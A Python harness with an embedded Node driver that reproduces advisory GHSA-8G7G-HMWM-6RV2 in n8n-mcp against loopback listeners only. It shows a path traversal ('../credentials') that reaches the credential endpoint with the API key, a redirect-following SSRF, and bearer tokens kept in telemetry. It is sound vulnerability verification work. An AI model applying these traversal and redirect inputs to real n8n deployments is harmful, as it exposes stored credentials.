"""Mechanism reproduction for GHSA-8G7G-HMWM-6RV2 (n8n-mcp).

The pinned upstream package for the current variant is verified, extracted
unchanged and driven through its own public entry points. All three defects the
advisory bundles are exercised in one run:

* path-segment traversal: ``N8nApiClient.getWorkflow('../credentials')``
  interpolates the caller string into the request path, so the outbound call
  carrying the configured n8n API key lands on ``/api/v1/credentials`` and the
  protected credential listing comes back to the caller;
* redirect-following SSRF: ``N8nApiClient.triggerWebhook()`` validates the
  initial URL once and then lets axios follow a 302 onto a second, unvalidated
  loopback host, whose response body is returned to the caller;
* telemetry payload exposure: ``MutationTracker.processMutation()`` builds a
  telemetry record whose ``operations`` / ``validationBefore`` /
  ``validationAfter`` / ``mutationError`` keep the caller's node parameter
  values verbatim, so a synthetic bearer token would leave the process with the
  default opt-in telemetry.

The same run also performs the legitimate operations (a normal workflow read, a
direct webhook post, a credential-free mutation) so a passing attack cannot be
explained by general breakage. Only loopback listeners owned by this process are
contacted; no external host, model or real credential is involved. Every marker
is synthetic.
"""

import hashlib
import json
import os
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from lab_support import parser, read_context, record

SCHEMA_VERSION = 1
PROTOCOL_VERSION = "HTTP/1.1"
LAB_DEFAULT = "/lab"
NODE_BUDGET_SECONDS = 240
OPERATION_HEADER = "x-attack-marker"
RECORDED_HEADERS = ("x-n8n-api-key", OPERATION_HEADER, "content-type")

TRAVERSAL_OPERATION = "traversal-get-workflow"
BENIGN_WORKFLOW_OPERATION = "benign-get-workflow"
REDIRECT_OPERATION = "redirect-trigger-webhook"
BENIGN_WEBHOOK_OPERATION = "benign-trigger-webhook"
TELEMETRY_OPERATION = "telemetry-process-mutation"
TELEMETRY_FIELDS = ("operations", "validationBefore", "validationAfter", "mutationError")

# The probe is kept inside this file so the image only has to ship reproduce.py:
# it is written next to the extracted package at run time. It calls the pinned
# library's own methods and never re-implements a vulnerable function.
DRIVER_SOURCE = r"""'use strict';

/*
 * Drives the pinned, unmodified n8n-mcp build extracted next to this script.
 * Only public entry points are called: N8nApiClient.getWorkflow,
 * N8nApiClient.triggerWebhook and MutationTracker.processMutation.
 *
 * argv: <packageDir> <scenario> <traversalId> <benignId> <apiPort>
 *       <redirectPort> <targetPort> <webhookPort> <telemetrySecret>
 *       <telemetryPlain> <apiKey>
 */

const path = require('path');

const [
  packageDir, scenario, traversalId, benignId, apiPort, redirectPort,
  targetPort, webhookPort, telemetrySecret, telemetryPlain, apiKey,
] = process.argv.slice(2);

const { N8nApiClient } = require(path.join(packageDir, 'dist', 'services', 'n8n-api-client.js'));
const { MutationTracker } = require(path.join(packageDir, 'dist', 'telemetry', 'mutation-tracker.js'));
const packageJson = require(path.join(packageDir, 'package.json'));

const OPERATION_HEADER = 'X-Attack-Marker';

function describe(error) {
  return {
    error: error && error.message ? error.message : String(error),
    error_name: error && error.name,
    error_code: error && error.code,
  };
}

async function capture(label, action, extract) {
  try {
    const value = await action();
    const picked = extract(value);
    return { operation: label, outcome: 'resolved', status: picked.status, body: picked.body };
  } catch (error) {
    return Object.assign({ operation: label, outcome: 'rejected' }, describe(error));
  }
}

function mutationPayload(secret, plain) {
  const value = secret ? `Bearer ${secret}` : plain;
  const workflow = (parameters) => ({
    nodes: [{
      id: '1',
      name: 'Webhook',
      type: 'n8n-nodes-base.webhook',
      typeVersion: 1,
      position: [0, 0],
      parameters,
    }],
    connections: {},
  });
  return {
    workflowBefore: workflow({}),
    workflowAfter: workflow({ header: { value } }),
    operations: [{
      type: 'updateNode',
      nodeName: 'Webhook',
      updates: { parameters: { header: { value } } },
    }],
    userIntent: secret
      ? 'renew the webhook authorization header'
      : 'set the demo header for the webhook node',
    validationBefore: {
      valid: true,
      errors: [],
      warnings: [],
      note: secret ? `pending ${secret}` : 'validated before the change',
    },
    validationAfter: {
      valid: !secret,
      errors: [],
      warnings: [],
      note: secret ? `rejected ${secret}` : 'validated after the change',
    },
    mutationSuccess: !secret,
    mutationError: secret ? `upstream rejected header ${secret}` : null,
    durationMs: 12,
    sessionId: 'session-1',
    toolName: 'n8n_update_partial_workflow',
  };
}

async function main() {
  const client = new N8nApiClient({
    baseUrl: `http://127.0.0.1:${apiPort}`,
    apiKey,
    timeout: 10000,
    maxRetries: 0,
  });

  // The client's axios instance is what actually builds the outbound request.
  // Tagging it with the operation name of the call in flight lets the observing
  // side attribute a captured request to the exact call that produced it. It
  // changes no request path, no validation decision and none of the headers the
  // library itself sets.
  const instance = client.client;
  if (!instance || !instance.defaults || !instance.defaults.headers) {
    throw new Error('pinned N8nApiClient does not expose its axios instance');
  }
  const attribute = (operation) => {
    instance.defaults.headers.common[OPERATION_HEADER] = operation;
  };

  const results = {};

  if (scenario === 'attack') {
    attribute('traversal-get-workflow');
    results['traversal-get-workflow'] = await capture(
      'traversal-get-workflow',
      () => client.getWorkflow(traversalId),
      (value) => ({ body: value }),
    );
  }

  attribute('benign-get-workflow');
  results['benign-get-workflow'] = await capture(
    'benign-get-workflow',
    () => client.getWorkflow(benignId),
    (value) => ({ body: value }),
  );

  if (scenario === 'attack') {
    results['redirect-trigger-webhook'] = await capture(
      'redirect-trigger-webhook',
      () => client.triggerWebhook({
        webhookUrl: `http://127.0.0.1:${redirectPort}/hook`,
        httpMethod: 'POST',
        data: { event: 'attack' },
        headers: { [OPERATION_HEADER]: 'redirect-trigger-webhook' },
        waitForResponse: true,
      }),
      (value) => ({ status: value.status, body: value.data }),
    );
  }

  results['benign-trigger-webhook'] = await capture(
    'benign-trigger-webhook',
    () => client.triggerWebhook({
      webhookUrl: `http://127.0.0.1:${webhookPort}/hook`,
      httpMethod: 'POST',
      data: { event: 'benign' },
      headers: { [OPERATION_HEADER]: 'benign-trigger-webhook' },
      waitForResponse: true,
    }),
    (value) => ({ status: value.status, body: value.data }),
  );

  const record_ = await new MutationTracker().processMutation(
    mutationPayload(
      scenario === 'attack' ? telemetrySecret : null,
      scenario === 'attack' ? null : telemetryPlain,
    ),
    'caller-1',
  );
  results['telemetry-process-mutation'] = {
    operation: 'telemetry-process-mutation',
    outcome: record_ ? 'resolved' : 'no-record',
    record: record_ || null,
  };

  process.stdout.write(JSON.stringify({
    upstream: {
      package: packageJson.name,
      version: packageJson.version,
      module: path.join(packageDir, 'dist', 'services', 'n8n-api-client.js'),
      telemetry_module: path.join(packageDir, 'dist', 'telemetry', 'mutation-tracker.js'),
      traversal_identifier: traversalId,
      benign_identifier: benignId,
    },
    observer: {
      webhook_security_mode: process.env.WEBHOOK_SECURITY_MODE || 'strict',
      listener_ports: { api: apiPort, redirect: redirectPort, target: targetPort, webhook: webhookPort },
      telemetry_payload_mode: scenario === 'attack' ? 'credential-bearing' : 'plain',
    },
    results,
  }) + '\n');
}

main().catch((error) => {
  process.stderr.write(`driver failure: ${error && error.stack ? error.stack : error}\n`);
  process.exitCode = 1;
});
"""


class QuietServer(ThreadingHTTPServer):
    """Threaded loopback server that ignores client disconnects at teardown."""

    daemon_threads = True

    def handle_error(self, request, client_address):
        error = sys.exc_info()[1]
        if isinstance(error, (ConnectionResetError, BrokenPipeError)):
            return
        super().handle_error(request, client_address)


class Listener:
    """Loopback HTTP listener that records what the upstream code sends."""

    def __init__(self, name, dispatch, port=0):
        self.name = name
        self.dispatch = dispatch
        self.events = []
        self.lock = threading.Lock()
        self.server = QuietServer(("127.0.0.1", port), self._handler())
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    @property
    def port(self):
        return self.server.server_address[1]

    def _record(self, payload):
        with self.lock:
            self.events.append({
                "seq": len(self.events) + 1,
                "listener": self.name,
                "method": payload["method"],
                "path": payload["path"],
                "headers": payload["headers"],
                "body": payload["body"][:500],
                "seen_at_ms": int(time.time() * 1000),
            })

    def snapshot(self):
        with self.lock:
            return [dict(event) for event in self.events]

    def shutdown(self):
        try:
            self.server.shutdown()
        finally:
            self.server.server_close()

    def _handler(self):
        outer = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = PROTOCOL_VERSION

            def log_message(self, *args):  # keep the container log clean
                pass

            def _handle(self):
                length = int(self.headers.get("Content-Length") or 0)
                raw = self.rfile.read(length) if length else b""
                captured = {name.lower(): value for name, value in self.headers.items()}
                payload = {
                    "method": self.command,
                    "path": self.path,
                    "headers": {name: captured.get(name) for name in RECORDED_HEADERS},
                    "body": raw.decode("utf-8", "replace"),
                    "operation": captured.get(OPERATION_HEADER),
                }
                outer._record(payload)
                status, body, extra = outer.dispatch(self.path, payload)
                encoded = json.dumps(body).encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(encoded)))
                for name, value in extra.items():
                    self.send_header(name, value)
                self.end_headers()
                self.wfile.write(encoded)

            do_GET = _handle
            do_POST = _handle

        return Handler


def write_json(path, value):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def lab_root():
    return Path(os.environ.get("N8N_MCP_LAB_ROOT") or LAB_DEFAULT)


def load_fixture():
    path = lab_root() / "fixtures" / "inputs.json"
    if not path.is_file():
        path = Path(__file__).resolve().parent / "fixtures" / "inputs.json"
    return json.loads(path.read_text(encoding="utf-8"))


def markers(fixture):
    return list(fixture["markers"].values())


def resolve_archive(name, version, variant):
    """Locate the pinned package archive, without downloading anything."""
    roots = [
        lab_root() / "inputs",
        Path("/inputs"),
        lab_root() / "upstream",
        lab_root(),
        lab_root().parent / "inputs",
    ]
    for root in roots:
        candidate = root / name
        if candidate.is_file() and candidate.stat().st_size > 0:
            return candidate
    for root in roots:
        if not root.is_dir():
            continue
        for candidate in sorted(root.glob("*.tgz")):
            if version and version in candidate.name:
                return candidate
    raise FileNotFoundError(
        f"pinned {variant} archive {name!r} (version {version}) is not present at any of: "
        + ", ".join(str(root / name) for root in roots)
    )


def extract_repo(archive, destination):
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(destination)
    package = destination / "package"
    if not (package / "package.json").is_file():
        raise RuntimeError(f"archive {archive} does not contain a package/ directory")
    return package


def node_executable():
    found = shutil.which("node") or shutil.which("nodejs")
    if not found:
        raise FileNotFoundError("the image must provide a node runtime for the pinned package")
    return found


def node_modules_root(repo):
    """Find the runtime dependencies the shipped dist code requires.

    The image installs them once (the recipe is free to choose the location);
    the package itself is extracted per run, so its modules are resolved through
    NODE_PATH rather than copied next to every temporary tree.
    """
    candidates = [
        Path(repo) / "node_modules",
        lab_root() / "upstream" / "node_modules",
        lab_root() / "node_modules",
        Path("/lab/node_modules"),
        Path("/node_modules"),
    ]
    candidates += sorted(lab_root().glob("*/node_modules"))
    candidates += sorted(lab_root().glob("*/*/node_modules"))
    for candidate in candidates:
        if (candidate / "axios" / "package.json").is_file():
            return candidate
    for part in os.environ.get("NODE_PATH", "").split(os.pathsep):
        if part and (Path(part) / "axios" / "package.json").is_file():
            return Path(part)
    raise FileNotFoundError(
        "the image must install the pinned package's runtime dependencies; axios was not found"
    )


def module_versions(root):
    versions = {}
    for package in ("axios", "zod"):
        manifest = root / package / "package.json"
        if manifest.is_file():
            versions[package] = json.loads(manifest.read_text(encoding="utf-8")).get("version")
    return versions


def run_probe(repo, workspace, ports, scenario, fixture, timeout=NODE_BUDGET_SECONDS):
    modules = node_modules_root(repo)
    script = workspace / "drive_upstream.cjs"
    script.write_text(DRIVER_SOURCE, encoding="utf-8")
    environment = dict(os.environ)
    environment["WEBHOOK_SECURITY_MODE"] = fixture["environment"]["WEBHOOK_SECURITY_MODE"]
    environment["NODE_PATH"] = os.pathsep.join(
        [str(modules)] + [part for part in os.environ.get("NODE_PATH", "").split(os.pathsep) if part])
    command = [
        node_executable(), str(script), str(repo), scenario,
        fixture["traversal"]["workflow_id"],
        fixture["benign"]["workflow_id"],
        str(ports["api"]), str(ports["redirect"]), str(ports["target"]), str(ports["webhook"]),
        fixture["telemetry"]["secret"], fixture["telemetry"]["benign_value"],
        fixture["traversal"]["api_key"],
    ]
    process = subprocess.Popen(
        command, cwd=str(repo), env=environment,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    try:
        stdout, stderr = process.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
        raise RuntimeError(f"upstream probe exceeded {timeout}s") from None
    sys.stdout.write(stdout)
    sys.stderr.write(stderr)
    if process.returncode != 0:
        raise RuntimeError(f"upstream probe exited {process.returncode}: {stderr.strip()[-400:]}")
    payload = None
    for line in reversed(stdout.splitlines()):
        line = line.strip()
        if line.startswith("{") and line.endswith("}"):
            try:
                payload = json.loads(line)
                break
            except json.JSONDecodeError:
                continue
    if not isinstance(payload, dict) or "results" not in payload:
        raise RuntimeError("upstream probe produced no machine-readable result")
    payload["dependencies"] = module_versions(modules)
    return payload


def digest(value):
    return hashlib.sha256(json.dumps(value, sort_keys=True, default=str).encode()).hexdigest()


def hit_for(listener, operation):
    return [event for event in listener.snapshot()
            if event["headers"].get(OPERATION_HEADER) == operation]


def summarise(listener, operation, secret_markers):
    hits = hit_for(listener, operation)
    return {
        "hits": len(hits),
        "paths": [hit["path"] for hit in hits],
        "api_key_present": bool(hits) and all(hit["headers"].get("x-n8n-api-key") for hit in hits),
        "request_carries_synthetic_credential": any(
            marker in (hit["body"] or "") for hit in hits for marker in secret_markers),
    }


def mechanism(operation, result, hits):
    body = result.get("body")
    return {
        "operation": operation,
        "node_outcome": result.get("outcome"),
        "node_error": result.get("error"),
        "node_status": result.get("status"),
        "response_digest": digest(body),
        "response_keys": sorted(body.keys()) if isinstance(body, dict) else [],
        "request_paths": hits["paths"],
        "api_key_present": hits["api_key_present"],
        "request_carries_synthetic_credential": hits["request_carries_synthetic_credential"],
    }


def telemetry_section(result, secret_markers):
    record_ = result.get("record") if isinstance(result, dict) else None
    serialized = json.dumps(record_, sort_keys=True, default=str) if record_ is not None else ""
    in_fields = {}
    for field in TELEMETRY_FIELDS:
        value = record_.get(field) if isinstance(record_, dict) else None
        in_fields[field] = [marker for marker in secret_markers
                            if marker in json.dumps(value, sort_keys=True, default=str)]
    return {
        "operation": TELEMETRY_OPERATION,
        "node_outcome": result.get("outcome"),
        "record_present": isinstance(record_, dict),
        "record_digest": digest(record_),
        "record_keys": sorted(record_.keys()) if isinstance(record_, dict) else [],
        "markers_in_fields": in_fields,
        "markers_anywhere": [marker for marker in secret_markers if marker in serialized],
        "markers_in_workflow_body": [
            marker for marker in secret_markers
            if marker in json.dumps((record_ or {}).get("workflowAfter"), sort_keys=True, default=str)],
    }


def build_observation(context, listeners, payload, scenario, secret_markers):
    results = payload["results"]
    observed = {}
    if scenario == "attack":
        observed["traversal"] = mechanism(
            TRAVERSAL_OPERATION, results[TRAVERSAL_OPERATION],
            summarise(listeners["api"], TRAVERSAL_OPERATION, secret_markers))
        observed["redirect"] = mechanism(
            REDIRECT_OPERATION, results[REDIRECT_OPERATION],
            summarise(listeners["target"], REDIRECT_OPERATION, secret_markers))
        observed["redirect_chain"] = {
            "first_hop_paths": summarise(
                listeners["redirect"], REDIRECT_OPERATION, secret_markers)["paths"],
            "second_hop_paths": summarise(
                listeners["target"], REDIRECT_OPERATION, secret_markers)["paths"],
        }
    observed["benign_workflow"] = mechanism(
        BENIGN_WORKFLOW_OPERATION, results[BENIGN_WORKFLOW_OPERATION],
        summarise(listeners["api"], BENIGN_WORKFLOW_OPERATION, secret_markers))
    observed["benign_webhook"] = mechanism(
        BENIGN_WEBHOOK_OPERATION, results[BENIGN_WEBHOOK_OPERATION],
        summarise(listeners["webhook"], BENIGN_WEBHOOK_OPERATION, secret_markers))
    observed["telemetry"] = telemetry_section(results[TELEMETRY_OPERATION], secret_markers)

    recorded = {name: listener.snapshot() for name, listener in sorted(listeners.items())}
    leaked = sorted({
        f"{event['listener']}:{event['path']}"
        for event in (item for events in recorded.values() for item in events)
        for marker in secret_markers
        if marker in json.dumps(event, sort_keys=True, default=str)
    })
    return {
        "schema_version": SCHEMA_VERSION,
        "variant": context["variant"],
        "scenario": scenario,
        "target_ready": True,
        "execution_status": "completed",
        "upstream": payload.get("upstream", {}),
        "dependencies": payload.get("dependencies", {}),
        "observer": payload.get("observer", {}),
        "observed": observed,
        "recorded_events": recorded,
        "credential_markers_in_observation": leaked,
    }


def shutdown(listeners):
    for listener in listeners.values():
        try:
            listener.shutdown()
        except Exception:  # noqa: BLE001 - teardown must not mask the verdict
            pass


def free_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def listener_fleet(fixture):
    ports = {name: free_port() for name in ("api", "redirect", "target", "webhook")}
    workflow_body = {
        "data": {
            "id": fixture["benign"]["workflow_id"],
            "name": "normal workflow",
            "active": False,
        }
    }

    def api_dispatch(path, request):
        if path == fixture["traversal"]["reached_path"]:
            return 200, fixture["traversal"]["credential_response"], {}
        if path == f"/api/v1/workflows/{fixture['benign']['workflow_id']}":
            return 200, workflow_body, {}
        return 404, {"message": "not found"}, {}

    def redirect_dispatch(path, request):
        location = f"http://127.0.0.1:{ports['target']}{fixture['redirect']['redirect_target_path']}"
        return 302, {"ok": True}, {"Location": location}

    def target_dispatch(path, request):
        return 200, fixture["redirect"]["target_response"], {}

    def webhook_dispatch(path, request):
        return 200, fixture["benign"]["webhook_response"], {}

    listeners = {}
    for name, dispatch in (("api", api_dispatch), ("redirect", redirect_dispatch),
                           ("target", target_dispatch), ("webhook", webhook_dispatch)):
        listeners[name] = Listener(name, dispatch, ports[name])
    return listeners, ports


def main():
    args = parser(__doc__).parse_args()
    context = read_context(args.context)
    scenario = context["scenario"]
    output = Path(args.output)
    output.mkdir(parents=True, exist_ok=True)

    listeners = {}
    observation = {
        "schema_version": SCHEMA_VERSION,
        "variant": context["variant"],
        "scenario": scenario,
        "target_ready": False,
        "execution_status": "failed",
        "collection_error": None,
    }
    effects = {}
    try:
        fixture = load_fixture()
        secret_markers = markers(fixture)
        spec = fixture["archives"][context["variant"]]
        archive = resolve_archive(spec["name"], spec["version"], context["variant"])
        listeners, ports = listener_fleet(fixture)
        with tempfile.TemporaryDirectory(prefix="n8n-mcp-lab-") as workspace:
            repo = extract_repo(archive, Path(workspace))
            payload = run_probe(repo, Path(workspace), ports, scenario, fixture)
            observation = build_observation(context, listeners, payload, scenario, secret_markers)
            write_json(output / "probe-output.json", payload)
            effects["probe-output.json"] = (output / "probe-output.json").read_text(encoding="utf-8")
    except Exception as error:  # noqa: BLE001 - a missing prerequisite is not a crash
        observation["collection_error"] = f"{type(error).__name__}: {error}"
        observation["target_ready"] = False
        observation["execution_status"] = "failed"
    finally:
        shutdown(listeners)

    observation["evidence_digest"] = digest({key: value for key, value in observation.items()
                                             if key != "evidence_digest"})
    return record(context, output, observation, effects)


if __name__ == "__main__":
    raise SystemExit(main())
